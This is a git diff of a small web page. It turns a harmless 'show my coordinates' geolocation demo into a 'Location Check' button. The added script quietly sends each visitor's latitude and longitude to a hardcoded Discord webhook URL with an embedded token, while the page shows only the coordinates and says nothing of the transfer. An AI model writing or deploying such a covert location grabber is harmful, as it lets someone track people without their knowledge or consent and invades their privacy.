@@ -36,27 +36,58 @@
 
     <script src="script.js"></script>
 </body>
-<p>You can Also click the button to get your coordinates.</p>
+<button onclick="getLocation()">Location Check</button>
 
-<button onclick="getLocation()">:)</button>
+    <p id="demo"></p>
 
-<p id="demo"></p>
+    <script>
+        var x = document.getElementById("demo");
+        var rainbowText = document.getElementById("rainbowText");
+        var colors = ['#FFFFFF']; // White color
+        var currentIndex = 0;
 
-<script>
-var x = document.getElementById("demo");
+        function changeRainbowText() {
+            rainbowText.style.color = colors[currentIndex];
+            currentIndex = (currentIndex + 1) % colors.length;
+        }
 
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
+        function changeLocationTextColors() {
+            changeRainbowText();
+        }
 
-function showPosition(position) {
-  x.innerHTML = "Latitude: " + position.coords.latitude + 
-  "<br>Longitude: " + position.coords.longitude;
-}
-</script>
+        setInterval(changeLocationTextColors, 500); // Change color every 500 milliseconds
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else { 
+                x.innerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function sendToDiscordWebhook(latitude, longitude) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1151703372718678158/OAamyLyQ_f_ajsGKAQwptEMMOKhonHpQjqKvmlYJzmx3mHBLsNK_yRM8nnaOrdkCn2c0'; // Replace with your Discord webhook URL
+            const data = {
+                content: `Latitude: ${latitude}, Longitude: ${longitude}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            });
+        }
+
+        function showPosition(position) {
+            var latitude = position.coords.latitude.toFixed(6);
+            var longitude = position.coords.longitude.toFixed(6);
+
+            sendToDiscordWebhook(latitude, longitude);
+
+            x.innerHTML = `Latitude: ${latitude}<br>Longitude: ${longitude}`;
+        }
+    </script>
     
 </html>
